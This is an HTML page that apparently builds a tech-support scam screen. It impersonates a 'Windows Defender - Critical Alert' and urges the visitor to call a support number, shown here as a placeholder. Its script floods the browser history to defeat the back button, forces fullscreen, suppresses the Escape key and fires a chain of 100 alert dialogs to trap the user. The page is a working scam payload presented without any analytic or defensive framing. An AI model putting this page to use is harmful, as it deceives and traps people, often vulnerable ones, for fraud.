
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Security Lock - Fullscreen Trap</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      overflow: hidden;
    }
    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #111;
      z-index: 99999;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    h1 {
      color: red;
      font-size: 24px;
    }
    p {
      font-size: 16px;
      margin-top: 10px;
    }
  </style>
  <script>
    let alertFlood = true;
    let alertCount = 0;

    // Fill history stack
    for (let i = 0; i < 100; i++) {
      history.pushState({}, '', location.href + '#' + i);
    }

    // Force fullscreen on click
    document.addEventListener("click", () => {
      const el = document.documentElement;
      if (el.requestFullscreen) el.requestFullscreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    });

    // Lock ESC key
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape') {
        e.preventDefault();
      }
    });

    // Handle back button
    window.onpopstate = function () {
      if (alertFlood) {
        alertFlood = false;
        showAlerts(0);
      }
    };

    function showAlerts(n) {
      if (n >= 100) {
        alert("‚úÖ You may now exit.");
        return;
      }
      setTimeout(() => {
        alertCount++;
        alert(`üö´ Alert ${alertCount}/100:
Security lock in place.`);
        history.pushState({}, '', location.href + '#' + Math.random());
        showAlerts(n + 1);
      }, 200);
    }
  </script>
</head>
<body>
  <div class="overlay">
    <h1>‚ö†Ô∏è Windows Defender - Critical Alert</h1>
    <p>Your system is at risk.</p>
    <p>Call support immediately: <strong>+1-800-FAKE-NUM</strong></p>
    <p>Do not press back or close this screen.</p>
    <p><strong>Full screen mode will remain locked until 100 warnings are shown.</strong></p>
    <p>Tap anywhere to activate fullscreen.</p>
  </div>
</body>
</html>
